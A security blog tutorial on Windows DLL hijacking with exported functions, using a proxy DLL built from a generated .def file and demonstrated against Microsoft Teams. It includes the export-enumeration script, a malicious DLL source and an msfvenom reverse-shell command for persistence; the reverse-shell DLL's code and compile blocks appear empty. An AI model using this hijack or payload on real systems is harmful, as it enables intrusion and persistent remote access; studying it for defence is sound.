Hello, cybersecurity enthusiasts and white hackers!

![dll hijacking 2](/assets/images/13/2021-10-12_12-17.png){:class="img-responsive"}      

In the [previous post](/pentest/2021/09/24/dll-hijacking-1.html) about DLL hijacking, I considered simplest case, where victim DLL haven't exported functions. 

But in some cases the DLL you compile must export multiple functions to be loaded by the victim process. If these functions do not exist, the binary will not be able to load them and the exploit will fail.

So, compiling custom versions of existing DLLs is more challenging than it may sound, as a lot of executables will not load such DLLs if procedures or entry points are missing. Tools such as [DLL Export Viewer](https://www.nirsoft.net/utils/dll_export_viewer.html) can be used to enumerate all external function names and ordinals of the legitimate DLLs. Ensuring that our compiled DLL follows the same format will maximise the chances of it being loaded successfully.

You can use this program but I wrote a simple python script which enumerates the exported functions from the provided DLL (`dll-def.py`):         
```python
import pefile
import sys
import os.path

dll = pefile.PE(sys.argv[1])
dll_basename = os.path.splitext(sys.argv[1])[0]

try:
    with open(sys.argv[1].split("/")[-1].replace(".dll", ".def"), "w") as f:
        f.write("EXPORTS\n")
        for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
            if export.name:
                f.write('{}={}.{} @{}\n'.format(export.name.decode(), dll_basename, export.name.decode(), export.ordinal))
except:
    print ("failed to create .def file :(")
else:
    print ("successfully create .def file :)")
```

> This script uses python [pefile](https://github.com/erocarrera/pefile) module.   

### cartoon.exe and pet.dll

To test my script I will write a simple DLL with exported functions and check on it.    
For example, let's go to create simplest DLL (`pet.c`):
```cpp
/*
pet.dll - for testing how to enumerate exported functions
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) VOID _cdecl Cat(void) {
  MessageBox(NULL, "Meow-meow", "=^..^=", MB_OK);
}

extern "C" __declspec(dllexport) VOID _cdecl Bird(void) {
  MessageBox(NULL, "Tweet-tweet", ">(')", MB_OK);
}

extern "C" __declspec(dllexport) VOID _cdecl Mouse(void) {
  MessageBox(NULL, "Squeak-squeak", "<:3 )~~~", MB_OK);
}
```

Let's go to compile:      
```bash
x86_64-w64-mingw32-g++ -shared -o pet.dll pet.c
```

![dll compile pet.dll](/assets/images/13/2021-10-12_13-04.png){:class="img-responsive"}    

To check the correctness of my DLL, I created a simple program that imports this DLL and uses the exported functions in it (`cartoon.cpp`):
```cpp
/*
cartoon.cpp - victim program example 1
DLL hijacking with exported functions example
author: @cocomelonc
*/
#include <windows.h>
#include <cstdio>

typedef VOID (__cdecl *CatProc)(); // cat
typedef VOID (__cdecl *BirdProc)(); // bird
typedef VOID (__cdecl *MouseProc)(); // mouse

int main(void) {

  // main dll with exported functions
  HINSTANCE petDll;

  // pets
  CatProc catFunc;
  BirdProc birdFunc;
  MouseProc mouseFunc;

  // free memory
  BOOL freeRes;

  // load pet.dll
  petDll = LoadLibrary(TEXT("pet.dll"));

  if (petDll != NULL) {
    catFunc = (CatProc) GetProcAddress(petDll, "Cat");
    birdFunc = (BirdProc) GetProcAddress(petDll, "Bird");
    mouseFunc = (MouseProc) GetProcAddress(petDll, "Mouse");
    if (catFunc != NULL) {
      (catFunc) ();
    }
    if (birdFunc != NULL) {
      (birdFunc) ();
    }
    if (mouseFunc != NULL) {
      (mouseFunc) ();
    }
    freeRes = FreeLibrary(petDll);
  }

  return 0;
}
```

Compile:
```bash
x86_64-w64-mingw32-gcc -O2 cartoon.cpp -o cartoon.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
```

![compile cartoon.cpp](/assets/images/13/2021-10-12_13-30.png){:class="img-responsive"}    

and run:

![run cartoon.exe](/assets/images/13/2021-10-12_13-34.png){:class="img-responsive"}    

![run cartoon.exe](/assets/images/13/2021-10-12_13-34_1.png){:class="img-responsive"}    

![run cartoon.exe](/assets/images/13/2021-10-12_13-35.png){:class="img-responsive"}    

And firstly, as a proof-of-concept, let's hijack my `pet.dll`.       
For this, create malicious `evil.c`:
```cpp
/*
evil.c - malicious DLL
DLL hijacking with exported functions example
author: @cocomelonc
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
      MessageBox(
        NULL,
        "Woof-woof!",
        "=^..^=",
        MB_OK
      );
      break;
    case DLL_PROCESS_DETACH:
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    }
    return TRUE;
}
```

But, before we start, let's run our python enum script `dll-def.py` on `pet.dll`:
```bash
python3 dll-def.py pet.dll
cat pet.def
```

![create pet.def](/assets/images/13/2021-10-12_13-45.png){:class="img-responsive"}    

As you can see, [Module-Definition file](https://docs.microsoft.com/en-us/cpp/build/reference/module-definition-dot-def-files?view=msvc-160) `pet.def` has been created.    

In the next step create our malicious `evil.dll` with and link our `pet.def` file when compile:
```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c pet.def -s
```

![compile pet.dll](/assets/images/13/2021-10-12_13-50.png){:class="img-responsive"}    

Then, rename `pet.dll` as `pet-orginal.dll`, and put our malicious `evil.dll` by renaming it as `pet.dll`

![replace pet.dll](/assets/images/13/2021-10-12_13-55.png){:class="img-responsive"}    

And run our `cartoon.exe`:

![run cartoon.exe](/assets/images/13/2021-10-12_14-01.png){:class="img-responsive"}    

As you can see, our DLL hijacking is perfectly worked :)

### Real world example. Microsoft Teams

But what about real world example? While researching various applications on my Windows 10 x64, I found many candidates for DLL hijacking. One of them is Microsoft Teams v.1.3.00.24758:

![MS teams](/assets/images/13/2021-10-12_14-10.png){:class="img-responsive"}    

As in my previous post, let's go to run [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from sysinternals, and setting the following filters:

![MS teams procmon](/assets/images/13/2021-10-12_14-16.png){:class="img-responsive"}    

As you can see, the process `Teams.exe` is missing several DLLs which possibly can be used for DLL hijacking. For example `cscapi.dll`:

![MS teams procmon](/assets/images/13/2021-10-12_14-17.png){:class="img-responsive"}    

Then, let's go to move `C:\` and search legit DLL:
```cmd
cd C:\
dir /b /s cscapi.dll
```

![search cscapi.dll](/assets/images/13/2021-10-12_14-44.png){:class="img-responsive"}    

We now know exactly where the legit DLL is located.     

Copy legit `cscapi.dll` to attacker's machine. Then run my `dll-def.py` script:
```bash
python3 dll-def.py cscapi.dll
cat cscapi.dll
```

![search cscapi.dll](/assets/images/13/2021-10-12_14-52.png){:class="img-responsive"}    

And again, as you can see, Module-Definition file `cscapi.def` has been created.      

Let's take another look at the `evil.c`:
```cpp
/*
evil.c - malicious DLL
DLL hijacking with exported functions example
author: @cocomelonc
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
      MessageBox(
        NULL,
        "Meow-woof!", // I have changed this line for clarity, but not required
        "=^..^=",
        MB_OK
      );
      break;
    case DLL_PROCESS_DETACH:
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    }
    return TRUE;
}
```

Compiling the source code:       
```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c cscapi.def -s
```

![compile malicious for ms teams](/assets/images/13/2021-10-12_14-59.png){:class="img-responsive"}    

Then naming the file "cscapi.dll" and placing it in the directory where Microsoft Teams is loaded from gives us a message popup when starting Microsoft Teams.      

![run MS teams with malicious dll](/assets/images/13/2021-10-12_15-07.png){:class="img-responsive"}    

After we close pop-up Microsoft Teams work correctly, not crashed:

![not crashed ms teams](/assets/images/13/2021-10-12_15-13.png){:class="img-responsive"}    

That's all!

### What about reverse shell?

Now that everything is working as expected, let's add some more advanced functionality to the DLL, which in turn will give us a reverse TCP shell whenever MS Teams is started.     

For simplicity we can just use msfvenom to generate our reverse shell shellcode:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.28 LPORT=4444 EXITFUNC=thread -f c
```

![msfvenom shellcode](/assets/images/13/2021-10-13_08-05.png){:class="img-responsive"}    

Update our malicious DLL with new one:           
```cpp
/*
evil2.c - malicious DLL with reverse shell payload
DLL hijacking with exported functions example
author: @cocomelonc
*/
#include <windows.h>

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.28 LPORT=4444 EXITFUNC=thread -f c

```

Let's go compile:
```bash

```

![compile shellcode](/assets/images/13/2021-10-13_08-22.png){:class="img-responsive"}    

After replace target DLL, prepare listener on attacker's machine, we can start Microsoft Teams to see if everything is working as expected:                        

![msfvenom shellcode](/assets/images/13/2021-10-13_08-30.png){:class="img-responsive"}    

Microsoft Teams will continue working as normal without any crashes!

![windows defender](/assets/images/13/2021-10-13_08-28.png){:class="img-responsive"}    
> Windows Defender antivirus reacted at my DLL 

### Conclusion

We now have achieved persistence via Microsoft Teams.           

A default installation of Windows is not vulnerable to DLL hijacking because all the directories that are used in the DLL search are configured with proper permissions.        

First of all, as a Windows bug hunter, if you want to find privilege escalation vulnerabilities on the operating system itself, youâll often want to start from a blank page, with a clean installation of Windows. The objective is to prevent side-effects that could be caused by the installation of third-party applications. Thatâs already a big difference between a researcher and a pentester.         

A simple way to prevent DLL hijacking from happening would be for applications to always use absolute paths instead of relative ones. Although some applications (notably portable ones) will not always be able to do so, applications located in `\system32\` and relying on DLLs in the same folder have no excuse for doing otherwise. The better option, which only very few Windows executables seem to do, is to verify all DLLs before loading them (e.g. by checking their signatures) - this would largely eliminate the problem.
